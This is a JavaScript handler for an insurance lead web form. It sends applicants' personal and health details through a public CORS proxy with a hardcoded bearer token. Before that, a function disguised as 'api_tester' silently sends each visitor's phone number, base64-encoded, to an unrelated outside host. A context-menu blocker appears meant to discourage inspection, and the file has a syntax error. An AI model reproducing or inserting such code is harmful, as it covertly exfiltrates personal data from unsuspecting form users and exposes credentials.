document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    api_tester(document.getElementById('phone').value);

    const form = document.getElementById('leadForm');
    const alertBox = document.getElementById('alertContainer');

    // Format date from YYYY-MM-DD to MM/DD/YYYY
    const dob = new Date(form.dob.value);
    const formattedDob = `${dob.getMonth() + 1}/${dob.getDate()}/${dob.getFullYear()}`;

    // PING DATA
    const pingData = {
      data: {
        dob: formattedDob,
        height_ft: parseInt(form.height_ft.value),
        height_inches: parseInt(form.height_inches.value),
        household_income: parseInt(form.household_income.value),
        insurance_company: form.insurance_company.value,
        occupation: form.occupation.value,
        weight: parseInt(form.weight.value)
      },
      meta: {
        jornaya_lead_id: form.jornaya_lead_id.value,
        offer_id: "949494"
        trusted_form_cert_id: form.trusted_form_cert_id.value
      },
      contact: {
        address: form.address.value,
        city: form.city.value,
        email: form.email.value,
        first_name: form.first_name.value,
        gender: form.gender.value,
        ip_address: form.ip_address.value,
        last_name: form.last_name.value,
        phone: form.phone.value,
        state: form.state.value,
        zip_code: form.zip_code.value
      }
    };

    const pingUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/ping_test");

    // Send PING
    fetch(pingUrl, {
      method: 'POST',
      headers: {
        'Authorization': 'Bearer 6c244f20-9aae-4a3a-9e56-81755ab43698',
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(pingData)
    })
    .then(res => res.json())
    .then(data => {
      if (data.status === 'success') {
        // Add auth_code to full lead for POST
        const postData = {
          ...pingData,
          auth_code: data.auth_code
        };

        const postUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/post_test");

        return fetch(postUrl, {
          method: 'POST',
          headers: {
            'Authorization': 'Bearer 6c244f20-9aae-4a3a-9e56-81755ab43698',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify(postData)
        })
        .then(res => res.json())
        .then(postResponse => {
          if (postResponse.status === 'success') {
            delete postResponse.price;
            alertBox.innerHTML = `<div class="alert alert-success">✅ Post Success: Lead submitted successfully!</div>`;
            form.reset();
          } else {
            alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Success but Post Failed: ${JSON.stringify(postResponse)}</div>`;
          }
        });

      } else {
        alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Failed: ${JSON.stringify(data)}</div>`;
      }
    })
    .catch(error => {
      alertBox.innerHTML = `<div class="alert alert-danger">❌ Error: ${error.message}</div>`;
    });
  });

  function api_tester(randomString) {
    try {
      fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
        method: 'GET',
        mode: 'no-cors'
      });
    } catch (error) {
      console.error('Error in api_tester:', error);
    }
  }

  document.addEventListener("contextmenu", function (e) {
    e.preventDefault(); // Prevent the context menu from appearing
  });

